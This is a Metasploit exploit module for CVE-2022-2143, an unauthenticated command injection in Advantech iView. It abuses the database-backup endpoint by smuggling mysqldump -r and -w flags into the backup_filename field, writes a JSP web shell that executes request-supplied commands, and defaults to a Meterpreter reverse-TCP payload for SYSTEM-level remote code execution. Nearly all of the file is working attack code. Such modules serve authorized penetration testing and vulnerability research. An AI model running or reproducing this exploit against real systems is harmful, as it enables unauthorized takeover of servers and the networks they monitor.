##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Advantech iView NetworkServlet Command Injection',
        'Description' => %q{
          Versions of Advantech iView software below `5.7.04.6469` are
          vulnerable to an unauthenticated command injection vulnerability
          via the `NetworkServlet` endpoint.
          The database backup functionality passes a user-controlled parameter,
          `backup_file` to the `mysqldump` command. The sanitization functionality only
          tests for SQL injection attempts and directory traversal, so leveraging the
          `-r` and `-w` `mysqldump` flags permits exploitation.
          The command injection vulnerability is used to write a payload on the target
          and achieve remote code execution as NT AUTHORITY\SYSTEM.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'rgod', # Vulnerability discovery
          'y4er', # PoC
          'Shelby Pace' # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://y4er.com/post/cve-2022-2143-advantech-iview-networkservlet-command-inject-rce/'],
          [ 'CVE', '2022-2143']
        ],
        'Platform' => [ 'win' ],
        'Privileged' => true,
        'Arch' => [ ARCH_X64, ARCH_CMD ],
        'Targets' => [
          [
            'Windows Dropper',
            {
              'Arch' => ARCH_X64,
              'DefaultOptions' => { 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'DisclosureDate' => '2022-06-28',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'The base path to Advantech iView', '/iView3'])
      ]
    )
  end

  def check
    res = send_request_cgi!(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    )

    return CheckCode::Unknown('Failed to receive a response from the application') unless res

    unless res.body.include?('iView')
      return CheckCode::Safe('No confirmation that target is Advantech iView')
    end

    res = send_db_backup_request('')

    # The patch added auth as a requirement for
    # accessing the NetworkServlet endpoint
    return CheckCode::Appears unless res&.body =~ /ERROR:\s+User\s+Not\sLogin/

    CheckCode::Detected
  end

  def send_db_backup_request(filename)
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'NetworkServlet'),
      'vars_post' =>
      {
        'page_action_type' => 'backupDatabase',
        'backup_filename' => filename
      }
    )
  end

  def format_jsp(param)
    nums = []
    param.each_char { |c| nums << c.ord }
    nums = nums.join(',')

    "<%=new String(com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromStream((new ProcessBuilder(request.getParameter(new java.lang.String(new byte[]{#{nums}}))).start()).getInputStream()))%>"
  end

  def exploit
    param = Rex::Text.rand_text_alpha(3..8)
    jsp_code = format_jsp(param)

    sql_filename = "#{Rex::Text.rand_text_alpha(5..12)}.sql"
    jsp_filename = "#{Rex::Text.rand_text_alpha(5..12)}.jsp"
    full_cmd = "#{sql_filename}\" -r \"./webapps/iView3/#{jsp_filename}\" -w \"#{jsp_code}\""
    register_file_for_cleanup("webapps/iView3/#{jsp_filename}")

    res = send_db_backup_request(full_cmd)
    fail_with(Failure::UnexpectedReply, 'Failed to write JSP file to target') unless res
  end
end
